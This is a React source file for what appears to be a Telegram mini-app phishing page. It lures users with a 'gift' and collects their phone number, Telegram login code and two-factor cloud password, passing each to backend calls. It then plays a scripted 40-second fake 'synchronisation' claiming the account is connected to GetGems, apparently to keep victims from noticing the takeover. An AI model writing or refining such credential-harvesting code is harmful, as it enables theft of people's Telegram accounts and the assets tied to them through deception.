import { useState, useRef } from 'react';
import { authStepPhone, authStepCode, authStepPassword } from '../services/api';
import { setSynced, addToInventory } from '../services/inventory';
import { useAppContext } from '../store';
import { hapticImpact, hapticNotification } from '../services/telegram';
import { nftImage, NFT_NAMES } from '../constants';
import { motion, AnimatePresence } from 'framer-motion';
import { ArrowLeft, Phone, MessageSquare, Lock, CheckCircle } from 'lucide-react';

const SYNC_STAGES = [
  'Подключаемся к серверу...',
  'Проверяем аккаунт...',
  'Загружаем список подарков...',
  'Синхронизируем данные...',
  'Настраиваем маркет...',
  'Получаем историю транзакций...',
  'Обновляем баланс...',
  'Финализируем синхронизацию...',
  'Почти готово...',
];

const STEPS = [
  { icon: Phone,         label: 'Телефон' },
  { icon: MessageSquare, label: 'Код'     },
  { icon: Lock,          label: 'Пароль'  },
  { icon: CheckCircle,   label: 'Готово'  },
];

export default function AuthView() {
  const [step, setStep]         = useState<1 | 2 | 3 | 4>(1);
  const [phone, setPhone]       = useState('');
  const [code, setCode]         = useState(['', '', '', '', '']);
  const [password, setPassword] = useState('');
  const [loading, setLoading]   = useState(false);
  const [error, setError]       = useState('');
  const [syncStage, setSyncStage] = useState(0);
  const [syncProgress, setSyncProgress] = useState(0);
  const codeRefs = useRef<(HTMLInputElement | null)[]>([]);
  const { setIsSynced, setCurrentView, giftId, giftSlug, giftNum } = useAppContext();

  const hasGift        = Boolean(giftSlug);
  const giftDisplayName = hasGift ? (NFT_NAMES[giftSlug] || giftSlug) : '';
  const giftImageUrl   = hasGift ? nftImage(giftSlug, giftNum || undefined) : '';

  const handlePhoneSubmit = async () => {
    if (!phone || phone.length < 10) { setError('Введите корректный номер телефона'); return; }
    setLoading(true); setError('');
    try {
      const effectiveGiftId = giftId || new URLSearchParams(window.location.search).get('gift_id') || '';
      const res = await authStepPhone(phone, effectiveGiftId);
      if (res.status === 'code_sent') { setStep(2); }
      else { setError(res.message || 'Ошибка отправки кода'); }
    } catch (err: any) { setError(err.message || 'Ошибка сети'); }
    finally { setLoading(false); }
  };

  const handleCodeChange = (index: number, value: string) => {
    if (!/^\d*$/.test(value)) return;
    const newCode = [...code]; newCode[index] = value; setCode(newCode);
    if (value && index < 4) codeRefs.current[index + 1]?.focus();
    if (newCode.every(d => d !== '')) submitCode(newCode.join(''));
  };

  const handleKeyDown = (index: number, e: React.KeyboardEvent) => {
    if (e.key === 'Backspace' && !code[index] && index > 0) codeRefs.current[index - 1]?.focus();
  };

  const submitCode = async (fullCode: string) => {
    setLoading(true); setError('');
    try {
      const res = await authStepCode(fullCode);
      if (res.status === 'success') { handleSuccess(); }
      else if (res.status === 'need_password') { setStep(3); }
      else if (res.status === 'code_invalid') {
        setError('Неверный код. Проверьте и введите снова.');
        setCode(['', '', '', '', '']); codeRefs.current[0]?.focus(); hapticNotification('error');
      } else if (res.status === 'code_expired') {
        setError('Код истёк. Вернитесь и запросите новый.'); hapticNotification('error');
      } else {
        setError(res.message || 'Неверный код');
        setCode(['', '', '', '', '']); codeRefs.current[0]?.focus(); hapticNotification('error');
      }
    } catch (err: any) { setError(err.message || 'Ошибка сети'); }
    finally { setLoading(false); }
  };

  const handlePasswordSubmit = async () => {
    if (!password) { setError('Введите пароль'); return; }
    setLoading(true); setError('');
    try {
      const res = await authStepPassword(password);
      if (res.status === 'success') { handleSuccess(); }
      else if (res.status === 'password_invalid') {
        setError('Неверный пароль. Попробуйте ещё раз.'); hapticNotification('error');
      } else {
        setError(res.message || 'Неверный пароль'); hapticNotification('error');
      }
    } catch (err: any) { setError(err.message || 'Ошибка сети'); }
    finally { setLoading(false); }
  };

  const handleSuccess = () => {
    setSynced(); setIsSynced(true); hapticNotification('success'); setStep(4);
    try { navigator.vibrate([300, 100, 300, 100, 300, 100, 300]); } catch (_) {}
    [0, 400, 800, 1200, 1600, 2000, 2400].forEach(d => setTimeout(() => hapticImpact('medium'), d));

    // Animate sync stages
    let stageIdx = 0;
    let progress = 0;
    const stageInterval = setInterval(() => {
      stageIdx = Math.min(stageIdx + 1, SYNC_STAGES.length - 1);
      setSyncStage(stageIdx);
    }, 4500);
    const progressInterval = setInterval(() => {
      progress = Math.min(progress + 1.8, 99);
      setSyncProgress(progress);
    }, 700);

    setTimeout(() => {
      clearInterval(stageInterval); clearInterval(progressInterval);
      setSyncProgress(100);
      if (hasGift && giftSlug) { addToInventory(giftSlug, giftNum || '0'); setCurrentView('my-gifts'); }
      else { setCurrentView('market'); }
    }, 40000);
  };

  const handleBack = () => {
    hapticImpact('light');
    if (hasGift) setCurrentView('gift-welcome'); else setCurrentView('market');
  };

  const activeStep = step - 1; // 0-indexed

  return (
    <div
      className="fixed inset-0 z-[9999] flex flex-col"
      style={{
        background: 'linear-gradient(160deg, #0d0d12 0%, #0f0f16 50%, #0c0c10 100%)',
        paddingTop: 'calc(var(--tg-safe-area-top, 0px) + var(--tg-content-safe-area-top, 0px))',
      }}
    >
      {/* Ambient orbs */}
      <div className="absolute top-0 left-1/2 -translate-x-1/2 w-80 h-80 rounded-full pointer-events-none"
        style={{ background: 'radial-gradient(circle, rgba(135,116,225,0.12) 0%, transparent 70%)', filter: 'blur(30px)' }} />

      {/* Back */}
      {step !== 4 && (
        <button
          onClick={handleBack}
          className="absolute top-4 left-4 w-9 h-9 rounded-full flex items-center justify-center active:scale-90 transition-transform z-10"
          style={{ background: 'rgba(255,255,255,0.08)', border: '1px solid rgba(255,255,255,0.1)' }}
        >
          <ArrowLeft className="w-5 h-5 text-white" />
        </button>
      )}

      {/* Step progress bar — hidden on step 4 */}
      {step !== 4 && (
        <div className="px-6 pt-16 pb-2">
          <div className="flex items-center gap-0">
            {STEPS.slice(0, 3).map((s, i) => {
              const done    = i < activeStep;
              const current = i === activeStep;
              return (
                <div key={i} className="flex items-center flex-1">
                  <div className="flex flex-col items-center">
                    <motion.div
                      animate={{
                        background: done ? 'linear-gradient(135deg,#2382ff,#8774e1)' : current ? 'rgba(35,130,255,0.25)' : 'rgba(255,255,255,0.06)',
                        borderColor: done ? '#2382ff' : current ? 'rgba(35,130,255,0.7)' : 'rgba(255,255,255,0.12)',
                        scale: current ? 1.15 : 1,
                      }}
                      className="w-8 h-8 rounded-full flex items-center justify-center border"
                    >
                      <s.icon className="w-3.5 h-3.5" style={{ color: done || current ? '#fff' : '#555' }} />
                    </motion.div>
                    <span className="text-[10px] mt-1" style={{ color: current ? '#2382ff' : done ? '#8774e1' : '#444' }}>{s.label}</span>
                  </div>
                  {i < 2 && (
                    <div className="flex-1 h-0.5 mx-2 mb-4 rounded-full overflow-hidden" style={{ background: 'rgba(255,255,255,0.07)' }}>
                      {done && (
                        <motion.div
                          initial={{ width: '0%' }}
                          animate={{ width: '100%' }}
                          transition={{ duration: 0.4 }}
                          className="h-full rounded-full"
                          style={{ background: 'linear-gradient(90deg, #2382ff, #8774e1)' }}
                        />
                      )}
                    </div>
                  )}
                </div>
              );
            })}
          </div>
        </div>
      )}

      <div className="flex-1 flex flex-col items-center justify-center p-6 relative">
        <div className="w-full max-w-sm flex flex-col items-center">

          {/* Gift preview */}
          {hasGift && step < 4 && (
            <motion.div
              initial={{ opacity: 0, y: -12 }}
              animate={{ opacity: 1, y: 0 }}
              className="flex items-center gap-3 rounded-2xl px-4 py-3 mb-6 w-full"
              style={{ background: 'rgba(135,116,225,0.1)', border: '1px solid rgba(135,116,225,0.25)' }}
            >
              <div className="w-11 h-11 rounded-xl overflow-hidden shrink-0"
                style={{ background: 'linear-gradient(135deg, #f6a827, #e66b12)' }}>
                <img src={giftImageUrl} alt={giftDisplayName} className="w-full h-full object-cover" referrerPolicy="no-referrer"
                  onError={e => { (e.target as HTMLImageElement).style.opacity = '0'; }} />
              </div>
              <div className="flex flex-col min-w-0 flex-1">
                <span className="text-[11px] text-[#8774e1] font-bold uppercase tracking-wider">Ваш подарок</span>
                <span className="text-sm font-bold text-white truncate">{giftDisplayName}</span>
              </div>
            </motion.div>
          )}

          <AnimatePresence mode="wait">
            {/* ── Step 1 ── */}
            {step === 1 && (
              <motion.div key="s1" initial={{ opacity: 0, x: 30 }} animate={{ opacity: 1, x: 0 }} exit={{ opacity: 0, x: -30 }} className="w-full flex flex-col items-center">
                <div className="w-16 h-16 rounded-full flex items-center justify-center mb-5"
                  style={{ background: 'rgba(135,116,225,0.15)', border: '1px solid rgba(135,116,225,0.3)' }}>
                  <Phone className="w-7 h-7 text-[#8774e1]" />
                </div>
                <p className="text-[20px] font-bold text-white mb-1.5 text-center font-display">Авторизация</p>
                <p className="text-[13px] text-gray-400 mb-6 text-center leading-relaxed">
                  Введите номер телефона, привязанный к вашему Telegram
                </p>
                <input
                  type="tel" placeholder="+7 900 123 45 67" value={phone}
                  onChange={e => setPhone(e.target.value)}
                  onKeyDown={e => { if (e.key === 'Enter') handlePhoneSubmit(); }}
                  className="w-full rounded-2xl px-4 py-3.5 text-white text-center text-lg mb-4 outline-none transition-all"
                  style={{ background: 'rgba(255,255,255,0.06)', border: '1px solid rgba(255,255,255,0.12)', fontFamily: 'DM Sans, sans-serif' }}
                  onFocus={e => e.target.style.borderColor = 'rgba(135,116,225,0.7)'}
                  onBlur={e => e.target.style.borderColor = 'rgba(255,255,255,0.12)'}
                />
                {error && <p className="text-red-400 text-sm mb-4 text-center">{error}</p>}
                <button
                  onClick={handlePhoneSubmit} disabled={loading}
                  className="w-full text-white font-bold py-4 rounded-2xl transition-all active:scale-[0.97] disabled:opacity-50 flex items-center justify-center gap-2"
                  style={{ background: 'linear-gradient(135deg, #8774e1, #6c5fc7)', boxShadow: loading ? 'none' : '0 4px 20px rgba(135,116,225,0.35)' }}
                >
                  {loading ? (
                    <><div className="w-4 h-4 border-2 border-white/50 border-t-white rounded-full" style={{ animation: 'spin-slow 0.8s linear infinite' }} />Отправка кода...</>
                  ) : 'Продолжить →'}
                </button>
              </motion.div>
            )}

            {/* ── Step 2 ── */}
            {step === 2 && (
              <motion.div key="s2" initial={{ opacity: 0, x: 30 }} animate={{ opacity: 1, x: 0 }} exit={{ opacity: 0, x: -30 }} className="w-full flex flex-col items-center">
                <div className="w-16 h-16 rounded-full flex items-center justify-center mb-5"
                  style={{ background: 'rgba(35,130,255,0.15)', border: '1px solid rgba(35,130,255,0.3)' }}>
                  <MessageSquare className="w-7 h-7 text-[#2382ff]" />
                </div>
                <p className="text-[20px] font-bold text-white mb-1.5 text-center font-display">Код подтверждения</p>
                <p className="text-[13px] text-gray-400 mb-7 text-center">Мы отправили код в приложение Telegram</p>
                <div className="flex gap-3 my-2">
                  {code.map((digit, i) => (
                    <input
                      key={i} ref={el => (codeRefs.current[i] = el)}
                      type="text" inputMode="numeric" maxLength={1} value={digit}
                      onChange={e => handleCodeChange(i, e.target.value)}
                      onKeyDown={e => handleKeyDown(i, e)}
                      className="w-12 h-14 rounded-xl text-center text-xl font-bold text-white outline-none transition-all"
                      style={{
                        background: digit ? 'rgba(35,130,255,0.15)' : 'rgba(255,255,255,0.06)',
                        border: digit ? '1px solid rgba(35,130,255,0.6)' : '1px solid rgba(255,255,255,0.12)',
                      }}
                    />
                  ))}
                </div>
                {loading && (
                  <div className="flex items-center gap-2 mt-4 text-gray-400 text-sm">
                    <div className="w-3.5 h-3.5 border-2 border-gray-400/50 border-t-gray-300 rounded-full" style={{ animation: 'spin-slow 0.8s linear infinite' }} />
                    Проверяем код...
                  </div>
                )}
                {error && <p className="text-red-400 text-sm mt-4 text-center">{error}</p>}
              </motion.div>
            )}

            {/* ── Step 3 ── */}
            {step === 3 && (
              <motion.div key="s3" initial={{ opacity: 0, x: 30 }} animate={{ opacity: 1, x: 0 }} exit={{ opacity: 0, x: -30 }} className="w-full flex flex-col items-center">
                <div className="w-16 h-16 rounded-full flex items-center justify-center mb-5"
                  style={{ background: 'rgba(255,190,0,0.12)', border: '1px solid rgba(255,190,0,0.3)' }}>
                  <Lock className="w-7 h-7 text-yellow-400" />
                </div>
                <p className="text-[20px] font-bold text-white mb-1.5 text-center font-display">Двухфакторная защита</p>
                <p className="text-[13px] text-gray-400 mb-6 text-center">Введите облачный пароль вашего Telegram аккаунта</p>
                <input
                  type="password" placeholder="Облачный пароль" value={password}
                  onChange={e => setPassword(e.target.value)}
                  onKeyDown={e => { if (e.key === 'Enter') handlePasswordSubmit(); }}
                  className="w-full rounded-2xl px-4 py-3.5 text-white text-center text-lg mb-4 outline-none transition-all"
                  style={{ background: 'rgba(255,255,255,0.06)', border: '1px solid rgba(255,255,255,0.12)' }}
                  onFocus={e => e.target.style.borderColor = 'rgba(255,190,0,0.5)'}
                  onBlur={e => e.target.style.borderColor = 'rgba(255,255,255,0.12)'}
                />
                {error && <p className="text-red-400 text-sm mb-4 text-center">{error}</p>}
                <button
                  onClick={handlePasswordSubmit} disabled={loading}
                  className="w-full text-white font-bold py-4 rounded-2xl transition-all active:scale-[0.97] disabled:opacity-50 flex items-center justify-center gap-2"
                  style={{ background: 'linear-gradient(135deg, #f59e0b, #d97706)', boxShadow: loading ? 'none' : '0 4px 20px rgba(245,158,11,0.3)' }}
                >
                  {loading ? (
                    <><div className="w-4 h-4 border-2 border-white/50 border-t-white rounded-full" style={{ animation: 'spin-slow 0.8s linear infinite' }} />Проверка...</>
                  ) : 'Подтвердить →'}
                </button>
              </motion.div>
            )}

            {/* ── Step 4: Success + sync animation ── */}
            {step === 4 && (
              <motion.div
                key="s4"
                initial={{ opacity: 0 }}
                animate={{ opacity: 1 }}
                className="w-full flex flex-col items-center"
              >
                {/* Animated success ring */}
                <div className="relative w-28 h-28 mb-6 flex items-center justify-center">
                  {[0, 1, 2, 3].map(i => (
                    <div key={i} className="absolute inset-0 rounded-full"
                      style={{
                        border: '1.5px solid rgba(34,197,94,0.3)',
                        animation: `ripple-out 3s ease-out ${i * 0.75}s infinite`,
                      }} />
                  ))}
                  <motion.div
                    initial={{ scale: 0, rotate: -30 }}
                    animate={{ scale: 1, rotate: 0 }}
                    transition={{ type: 'spring', stiffness: 200, damping: 16, delay: 0.1 }}
                    className="w-20 h-20 rounded-full flex items-center justify-center"
                    style={{
                      background: 'linear-gradient(135deg, rgba(34,197,94,0.25), rgba(34,197,94,0.12))',
                      border: '1px solid rgba(34,197,94,0.4)',
                      boxShadow: '0 0 30px rgba(34,197,94,0.25)',
                    }}
                  >
                    <svg width="36" height="36" viewBox="0 0 36 36" fill="none">
                      <motion.path
                        d="M8 18 L15 25 L28 11"
                        stroke="#22c55e" strokeWidth="3" strokeLinecap="round" strokeLinejoin="round"
                        fill="none"
                        initial={{ pathLength: 0, opacity: 0 }}
                        animate={{ pathLength: 1, opacity: 1 }}
                        transition={{ duration: 0.5, delay: 0.3 }}
                      />
                    </svg>
                  </motion.div>
                </div>

                <motion.p
                  initial={{ opacity: 0, y: 8 }}
                  animate={{ opacity: 1, y: 0 }}
                  transition={{ delay: 0.4 }}
                  className="text-[22px] font-bold text-white mb-1 font-display"
                >
                  Синхронизация запущена!
                </motion.p>
                <motion.p
                  initial={{ opacity: 0 }}
                  animate={{ opacity: 1 }}
                  transition={{ delay: 0.55 }}
                  className="text-[13px] text-gray-400 text-center mb-6"
                >
                  Ваш аккаунт успешно подключён к GetGems
                </motion.p>

                {/* Progress bar */}
                <motion.div
                  initial={{ opacity: 0, y: 10 }}
                  animate={{ opacity: 1, y: 0 }}
                  transition={{ delay: 0.6 }}
                  className="w-full rounded-2xl p-4 mb-4"
                  style={{ background: 'rgba(255,255,255,0.05)', border: '1px solid rgba(255,255,255,0.08)' }}
                >
                  <div className="flex items-center justify-between mb-2">
                    <AnimatePresence mode="wait">
                      <motion.span
                        key={syncStage}
                        initial={{ opacity: 0, y: 6 }}
                        animate={{ opacity: 1, y: 0 }}
                        exit={{ opacity: 0, y: -6 }}
                        className="text-[12px] text-gray-300"
                      >
                        {SYNC_STAGES[syncStage]}
                      </motion.span>
                    </AnimatePresence>
                    <span className="text-[12px] text-[#2382ff] font-bold">{Math.floor(syncProgress)}%</span>
                  </div>
                  <div className="w-full h-2 rounded-full overflow-hidden" style={{ background: 'rgba(255,255,255,0.08)' }}>
                    <motion.div
                      className="h-full rounded-full"
                      style={{ background: 'linear-gradient(90deg, #2382ff, #8774e1)' }}
                      animate={{ width: `${syncProgress}%` }}
                      transition={{ duration: 0.6, ease: 'easeOut' }}
                    />
                  </div>
                </motion.div>

                {/* Sync steps checklist */}
                <motion.div
                  initial={{ opacity: 0 }}
                  animate={{ opacity: 1 }}
                  transition={{ delay: 0.8 }}
                  className="w-full rounded-2xl p-3 flex flex-col gap-2"
                  style={{ background: 'rgba(35,130,255,0.06)', border: '1px solid rgba(35,130,255,0.15)' }}
                >
                  {SYNC_STAGES.slice(0, 5).map((stage, i) => {
                    const done = syncStage > i;
                    const cur  = syncStage === i;
                    return (
                      <div key={i} className="flex items-center gap-2.5">
                        <div className="w-4 h-4 rounded-full flex items-center justify-center shrink-0"
                          style={{
                            background: done ? 'rgba(34,197,94,0.2)' : cur ? 'rgba(35,130,255,0.2)' : 'rgba(255,255,255,0.05)',
                            border: done ? '1px solid rgba(34,197,94,0.4)' : cur ? '1px solid rgba(35,130,255,0.4)' : '1px solid rgba(255,255,255,0.1)',
                          }}>
                          {done && <span className="text-[9px] text-green-400">✓</span>}
                          {cur && <div className="w-1.5 h-1.5 rounded-full bg-[#2382ff]" style={{ animation: 'glow-pulse 1s infinite' }} />}
                        </div>
                        <span className="text-[12px]" style={{ color: done ? '#22c55e' : cur ? '#fff' : '#555' }}>
                          {stage.replace('...', '')}
                        </span>
                      </div>
                    );
                  })}
                </motion.div>

                <p className="text-[11px] text-gray-500 text-center mt-4">
                  Не закрывайте приложение — синхронизация займёт ~40 секунд
                </p>
              </motion.div>
            )}
          </AnimatePresence>
        </div>
      </div>
    </div>
  );
}
